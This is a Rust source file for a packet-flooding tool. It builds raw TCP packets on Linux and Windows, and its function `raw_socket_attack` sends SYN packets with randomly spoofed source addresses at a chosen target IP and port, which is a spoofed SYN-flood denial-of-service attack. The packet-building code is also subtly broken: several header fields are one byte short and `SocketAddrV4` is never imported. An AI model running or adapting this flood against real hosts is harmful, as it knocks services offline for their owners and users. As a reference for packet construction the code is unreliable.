use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use crate::types::types::*;

#[cfg(target_os = "linux")]
use std::os::unix::io::AsRawFd;

#[cfg(target_os = "linux")]
use nix::sys::socket::{socket, AddressFamily, SockType, SockFlag, MsgFlags, sendto};
#[cfg(target_os = "linux")]
use nix::net::if_::if_nametoindex;
#[cfg(target_os = "linux")]
use nix::sys::uio::IoVec;

#[cfg(all(target_os = "windows", feature = "pnet_datalink"))]
use pnet::datalink::{self, Channel::Ethernet};
#[cfg(all(target_os = "windows", feature = "pnet_datalink"))]
use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};

pub enum RawSocketType {
    TcpSyn,
    TcpAck,
}

pub struct CrossPlatformRawSocket {
    inner: Option<Box<dyn RawSocketTrait>>,
    available: Arc<AtomicBool>,
}

#[allow(dead_code)]
trait RawSocketTrait: Send {
    fn send_tcp_packet(&mut self, src_ip: Ipv4Addr, dst_ip: Ipv4Addr,
                        src_port: u16, dst_port: u16, flags: u8) -> Result<(), String>;
    fn is_available(&self) -> bool;
}

#[cfg(target_os = "linux")]
struct LinuxRawSocket {
    fd: std::os::unix::io::RawFd,
    interface_index: u32,
}

#[cfg(target_os = "linux")]
impl LinuxRawSocket {
    fn new(interface: &str) -> Result<Self, String> {
        let fd = socket(
            AddressFamily::Inet,
            SockType::Raw,
            SockFlag::empty(),
            Some(nix::sys::socket::Protocol::Tcp),
        ).map_err(|e| format!("Failed to create raw socket: {}", e))?;

        let interface_index = if_nametoindex(interface)
            .map_err(|e| format!("Failed to get interface index: {}", e))?;

        // Set socket options
        nix::sys::socket::setsockopt(fd, nix::sys::socket::sockopt::IpHdrIncl, &true)
            .map_err(|e| format!("Failed to set IP_HDRINCL: {}", e))?;

        Ok(Self { fd, interface_index })
    }
}

#[cfg(target_os = "linux")]
impl RawSocketTrait for LinuxRawSocket {
    fn send_tcp_packet(&mut self, src_ip: Ipv4Addr, dst_ip: Ipv4Addr,
                        src_port: u16, dst_port: u16, flags: u8) -> Result<(), String> {
        let packet = build_ip_packet(src_ip, dst_ip, src_port, dst_port, flags);
        let iov = IoVec::from_slice(&packet);

        let dest_addr = nix::sys::socket::SockaddrIn::new(
            nix::sys::socket::InetAddr::from_std(std::net::SocketAddr::V4(
                SocketAddrV4::new(dst_ip, dst_port)
            )),
        );

        sendto(self.fd, &[iov], &[], MsgFlags::empty(), Some(&dest_addr))
            .map_err(|e| format!("Failed to send packet: {}", e))?;

        Ok(())
    }

    fn is_available(&self) -> bool { true }
}

#[cfg(all(target_os = "windows", feature = "pnet_datalink"))]
struct WindowsRawSocket {
    channel: Option<Box<dyn datalink::DataLinkSender>>,
    src_mac: Option<[u8; 6]>,
    dst_mac: Option<[u8; 6]>,
}

#[cfg(all(target_os = "windows", feature = "pnet_datalink"))]
impl WindowsRawSocket {
    pub fn new(interface_name: &str) -> Result<Self, String> {
        // Find the interface
        let interface_name_match = interface_name.to_lowercase();

        let interfaces = datalink::interfaces()
            .into_iter()
            .find(|iface| iface.name.to_lowercase() == interface_name_match)
            .ok_or_else(|| format!("Interface '{}' not found", interface_name))?;

        // Create channel
        let config = datalink::Config {
            write_buffer_size: 4096,
            read_buffer_size: 4096,
            ..Default::default()
        };

        match datalink::channel(&interfaces, config) {
            Ok(Ethernet(tx, _rx)) => {
                // Get MAC addresses
                let src_mac = interfaces.mac.map(|mac| mac.octets());
                let dst_mac = Some([0x00, 0x00, 0x00, 0x00, 0x00, 0x00]); // Will be updated

                Ok(Self {
                    channel: Some(tx),
                    src_mac,
                    dst_mac,
                })
            }
            Ok(_) => Err("Unsupported channel type".to_string()),
            Err(e) => Err(format!("Failed to create channel: {}", e)),
        }
    }

    fn build_ethernet_packet(&self, src_mac: [u8; 6], dst_mac: [u8; 6], payload: &[u8]) -> Vec<u8> {
        let mut buffer = vec![0u8; 14 + payload.len()];
        let mut eth_packet = MutableEthernetPacket::new(&mut buffer).unwrap();

        eth_packet.set_destination(dst_mac.into());
        eth_packet.set_source(src_mac.into());
        eth_packet.set_ethertype(EtherTypes::Ipv4);

        let payload_offset = 14;
        buffer[payload_offset..].copy_from_slice(payload);
        buffer
    }

    fn resolve_gateway_mac(&self, target_ip: Ipv4Addr) -> Result<[u8; 6], String> {
        // For simplicity, assume the gateway is the first hop
        // In a real implementation, you'd use ARP to resolve this
        if target_ip.is_private() {
            // Try to get the default gateway
            match local_ip_address::local_ip() {
                Ok(local_ip) => {
                    if local_ip.is_ipv4() {
                        // For local network, try to resolve with ARP
                        // This is a simplified approach
                        Ok([0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) // Placeholder
                    } else {
                        Err("Cannot determine gateway for IPv6 target".to_string())
                    }
                }
                Err(_) => Err("Cannot determine local IP".to_string()),
            }
        } else {
            // For external IPs, use the default gateway
            // This would typically be your router's MAC
            Ok([0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) // Placeholder
        }
    }
}

#[cfg(all(target_os = "windows", feature = "pnet_datalink"))]
impl RawSocketTrait for WindowsRawSocket {
    fn send_tcp_packet(&mut self, src_ip: Ipv4Addr, dst_ip: Ipv4Addr,
                        src_port: u16, dst_port: u16, flags: u8) -> Result<(), String> {
        // Resolve MAC addresses first
        let src_mac = self.src_mac.unwrap_or([0x02, 0x00, 0x00, 0x00, 0x00, 0x01]);
        let dst_mac = match self.dst_mac {
            Some(mac) => mac,
            None => match self.resolve_gateway_mac(dst_ip) {
                Ok(mac) => {
                    self.dst_mac = Some(mac);
                    mac
                }
                Err(_) => [0xff, 0xff, 0xff, 0xff, 0xff, 0xff], // Broadcast
            }
        };

        // Build packets
        let ip_packet = build_ip_packet(src_ip, dst_ip, src_port, dst_port, flags);
        let eth_packet = self.build_ethernet_packet(src_mac, dst_mac, &ip_packet);

        // Get channel and send
        let channel = self.channel.as_mut()
            .ok_or("Channel not initialized")?;

        if let Some(result) = channel.send_to(eth_packet.as_slice(), None) {
            match result {
                Ok(_) => Ok(()),
                Err(e) => Err(format!("Failed to send packet: {}", e)),
            }
        } else {
            Err("Failed to send packet".to_string())
        }
    }

    fn is_available(&self) -> bool {
        self.channel.is_some()
    }
}

#[cfg(not(any(target_os = "linux", target_os = "windows")))]
struct OtherRawSocket;

#[cfg(all(target_os = "windows", not(feature = "pnet_datalink")))]
struct WindowsRawSocketFallback;

#[cfg(not(any(target_os = "linux", target_os = "windows")))]
impl RawSocketTrait for OtherRawSocket {
    fn send_tcp_packet(&mut self, _src_ip: Ipv4Addr, _dst_ip: Ipv4Addr,
                        _src_port: u16, _dst_port: u16, _flags: u8) -> Result<(), String> {
        Err("Raw sockets not supported on this platform".to_string())
    }

    fn is_available(&self) -> bool { false }
}

#[cfg(all(target_os = "windows", not(feature = "pnet_datalink")))]
impl RawSocketTrait for WindowsRawSocketFallback {
    fn send_tcp_packet(&mut self, _src_ip: Ipv4Addr, _dst_ip: Ipv4Addr,
                        _src_port: u16, _dst_port: u16, _flags: u8) -> Result<(), String> {
        Err("Raw sockets on Windows require Npcap. Please install Npcap from https://npcap.com/".to_string())
    }

    fn is_available(&self) -> bool { false }
}

#[allow(dead_code)]
impl CrossPlatformRawSocket {
    pub fn new(interface: &str) -> Self {
        let available = Arc::new(AtomicBool::new(false));

        let inner: Option<Box<dyn RawSocketTrait>> = {
            #[cfg(target_os = "linux")]
            {
                match LinuxRawSocket::new(interface) {
                    Ok(socket) => {
                        available.store(true, Ordering::Relaxed);
                        Some(Box::new(socket))
                    }
                    Err(e) => {
                        println!("Warning: Raw socket not available: {}", e);
                        None
                    }
                }
            }

            #[cfg(all(target_os = "windows", feature = "pnet_datalink"))]
            {
                // Check if Npcap is installed by looking for the DLL
                let npcap_available = std::path::Path::new("C:\\Windows\\System32\\Npcap\\wpcap.dll").exists()
                    || std::path::Path::new("C:\\Windows\\SysWOW64\\Npcap\\wpcap.dll").exists();

                if npcap_available {
                    match WindowsRawSocket::new(interface) {
                        Ok(socket) => {
                            available.store(true, Ordering::Relaxed);
                            Some(Box::new(socket))
                        }
                        Err(e) => {
                            println!("Warning: Failed to initialize raw socket: {}", e);
                            None
                        }
                    }
                } else {
                    println!("Warning: Raw sockets on Windows require WinPcap/Npcap");
                    println!("Please install Npcap from: https://npcap.com/");
                    None
                }
            }

            #[cfg(all(target_os = "windows", not(feature = "pnet_datalink")))]
            {
                println!("Warning: Raw sockets on Windows require the pnet_datalink feature");
                println!("Build with: cargo build --features pnet_datalink");
                Some(Box::new(WindowsRawSocketFallback))
            }

            #[cfg(not(any(target_os = "linux", target_os = "windows")))]
            {
                println!("Warning: Raw sockets not supported on this platform");
                Some(Box::new(OtherRawSocket))
            }
        };

        Self { inner, available }
    }

    pub fn send_tcp_packet(&mut self, src_ip: Ipv4Addr, dst_ip: Ipv4Addr,
                           src_port: u16, dst_port: u16, packet_type: RawSocketType) -> Result<(), String> {
        let flags = match packet_type {
            RawSocketType::TcpSyn => 0x02,
            RawSocketType::TcpAck => 0x10,
        };

        if let Some(ref mut socket) = self.inner {
            socket.send_tcp_packet(src_ip, dst_ip, src_port, dst_port, flags)
        } else {
            Err("Raw socket not initialized".to_string())
        }
    }

    pub fn is_available(&self) -> bool {
        self.available.load(Ordering::Relaxed)
    }
}

#[allow(dead_code)]
fn build_ip_packet(src_ip: Ipv4Addr, dst_ip: Ipv4Addr, src_port: u16, dst_port: u16, flags: u8) -> Vec<u8> {
    let mut packet = Vec::with_capacity(40); // IP header (20) + TCP header (20)

    // IP Header (20 bytes)
    packet.push(0x45); // Version (4) + IHL (5)
    packet.push(0x00); // Type of Service
    packet.extend_from_slice(&(40u16).to_be_bytes()); // Total Length
    packet.extend_from_slice(&rand::random::<u16>().to_be_bytes()); // Identification
    packet.push(0x40); // Flags (Don't Fragment) + Fragment Offset (high byte)
    packet.push(0x00); // Fragment Offset (low byte)
    packet.push(64); // TTL
    packet.push(6); // Protocol (TCP)
    packet.push(0x00); // Header Checksum (will be calculated)
    packet.extend_from_slice(&src_ip.octets());
    packet.extend_from_slice(&dst_ip.octets());

    // Calculate IP checksum
    let ip_checksum = calculate_checksum(&packet[0..20]);
    packet[10] = (ip_checksum >> 8) as u8;
    packet[11] = ip_checksum as u8;

    // TCP Header (20 bytes)
    packet.extend_from_slice(&src_port.to_be_bytes());
    packet.extend_from_slice(&dst_port.to_be_bytes());
    packet.extend_from_slice(&rand::random::<u32>().to_be_bytes()); // Sequence Number
    packet.extend_from_slice(&0u32.to_be_bytes()); // Acknowledgment Number
    packet.push(0x50); // Data Offset (5) + Reserved (0)
    packet.push(flags); // Flags
    packet.extend_from_slice(&65535u16.to_be_bytes()); // Window Size
    packet.push(0x00); // Checksum (will be calculated)
    packet.push(0x00); // Urgent Pointer
    packet.extend_from_slice(&[0u8; 4]); // Options (none)

    // Calculate TCP checksum
    let tcp_checksum = calculate_tcp_checksum(&packet[20..40], src_ip, dst_ip);
    packet[38] = (tcp_checksum >> 8) as u8;
    packet[39] = tcp_checksum as u8;

    packet
}

#[allow(dead_code)]
fn calculate_checksum(data: &[u8]) -> u16 {
    let mut sum = 0u32;

    for i in (0..data.len()).step_by(2) {
        if i + 1 < data.len() {
            sum += u16::from_be_bytes([data[i], data[i + 1]]) as u32;
        } else {
            sum += (data[i] as u32) << 8;
        }
    }

    while (sum >> 16) > 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    !sum as u16
}

#[allow(dead_code)]
fn calculate_tcp_checksum(tcp_header: &[u8], src_ip: Ipv4Addr, dst_ip: Ipv4Addr) -> u16 {
    let mut pseudo_header = Vec::with_capacity(12);
    pseudo_header.extend_from_slice(&src_ip.octets());
    pseudo_header.extend_from_slice(&dst_ip.octets());
    pseudo_header.push(0); // Zero
    pseudo_header.push(6); // Protocol (TCP)
    pseudo_header.extend_from_slice(&(tcp_header.len() as u16).to_be_bytes());

    let mut all_data = pseudo_header;
    all_data.extend_from_slice(tcp_header);

    if all_data.len() % 2 != 0 {
        all_data.push(0);
    }

    calculate_checksum(&all_data)
}

#[allow(dead_code)]
pub async fn raw_socket_attack(
    config: &AtkConfig,
    stats: &AtkStats,
    raw_socket: &mut CrossPlatformRawSocket,
) -> Result<(), String> {
    let target_ip = config.target.parse::<Ipv4Addr>()
        .map_err(|_| "Invalid target IP address".to_string())?;

    let packet_count = config.rate.min(1000); // Limit for raw socket demo

    println!("Starting raw socket attack to {}:{}", config.target, config.port);
    println!("Raw socket available: {}", raw_socket.is_available());

    for i in 0..packet_count {
        if !stats.is_running.load(std::sync::atomic::Ordering::Relaxed) {
            break;
        }

        let src_ip = Ipv4Addr::new(
            rand::random::<u8>(),
            rand::random::<u8>(),
            rand::random::<u8>(),
            rand::random::<u8>(),
        );
        let src_port = rand::random::<u16>();

        if raw_socket.is_available() {
            if let Err(e) = raw_socket.send_tcp_packet(
                src_ip, target_ip, src_port, config.port,
                RawSocketType::TcpSyn
            ) {
                println!("Failed to send raw packet {}: {}", i, e);
                stats.add_failed();
            } else {
                stats.add_packet(40); // 40 bytes for IP+TCP header
            }
        } else {
            println!("Raw sockets not available - cannot send packets");
            stats.add_failed();
        }

        // Rate limiting
        tokio::time::sleep(std::time::Duration::from_micros(
            1_000_000 / config.rate.max(1)
        )).await;
    }

    Ok(())
}
